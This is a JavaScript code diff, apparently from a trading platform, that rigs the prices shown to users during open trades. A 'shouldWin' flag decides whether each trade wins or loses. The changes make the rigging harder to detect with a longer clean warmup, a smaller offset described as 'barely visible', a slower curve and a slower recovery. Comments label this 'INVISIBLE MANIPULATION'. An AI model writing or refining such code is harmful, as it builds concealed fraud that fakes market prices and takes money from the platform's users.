@@ -941,35 +941,33 @@
       const elapsed = now - manipulation.startTime;
       const progress = Math.min(elapsed / manipulation.duration, 1);
       
-      // === NATURAL APPROACH: follow real market + tiny offset ===
-      // First 40% of trade: no manipulation, just follow market
-      const warmupProgress = Math.min(elapsed / (manipulation.duration * 0.4), 1);
+      // === INVISIBLE MANIPULATION: almost no visible change ===
+      // First 60% of trade: no manipulation at all
+      const warmupDuration = manipulation.duration * 0.6;
       
-      if (warmupProgress < 1) {
-        // Pure market data, no manipulation
+      if (elapsed < warmupDuration) {
+        // Pure market data
         manipulation.lastManipulatedPrice = realPrice;
         return realPrice;
       }
       
-      // After warmup: gradually add tiny offset
-      const manipulationProgress = (elapsed - manipulation.duration * 0.4) / (manipulation.duration * 0.6);
+      // Last 40%: ultra-slow tiny offset
+      const manipulationProgress = (elapsed - warmupDuration) / (manipulation.duration * 0.4);
       
-      // Very small max change: 0.15-0.3% depending on duration
-      const maxChangePercent = 0.0015 + (manipulation.duration / 300000) * 0.0015;
+      // Tiny max change: only 0.05-0.1% - barely visible
+      const maxChangePercent = 0.0005 + (manipulation.duration / 300000) * 0.0005;
       const maxChange = manipulation.entryPrice * maxChangePercent;
       
       // Direction: favorable for WIN, against for LOSS
       const favorableDirection = manipulation.direction === 'up' ? 1 : -1;
       const actualDirection = manipulation.shouldWin ? favorableDirection : -favorableDirection;
       
-      // Very smooth S-curve for natural feel
-      const smoothCurve = manipulationProgress < 0.5 
-        ? 2 * Math.pow(manipulationProgress, 2)
-        : 1 - Math.pow(-2 * manipulationProgress + 2, 2) / 2;
+      // Ultra smooth curve - power of 4 for very slow start
+      const smoothCurve = Math.pow(manipulationProgress, 4);
       
       const offset = maxChange * smoothCurve * actualDirection;
       
-      // Apply offset to real price (follows real market movement)
+      // Apply offset to real price
       const manipulatedPrice = realPrice + offset;
       
       manipulation.lastManipulatedPrice = manipulatedPrice;
@@ -978,11 +976,11 @@
     
     if (manipulation.recovering) {
       const elapsed = now - manipulation.recoverStart;
-      const recoveryDuration = 30000; // 30 seconds recovery
+      const recoveryDuration = 60000; // 60 seconds very slow recovery
       const progress = Math.min(elapsed / recoveryDuration, 1);
       
-      // Smooth ease-out curve for recovery
-      const curve = 1 - Math.pow(1 - progress, 2);
+      // Very smooth ease-out
+      const curve = 1 - Math.pow(1 - progress, 3);
       
       if (progress >= 1) {
         manipulation.recovering = false;
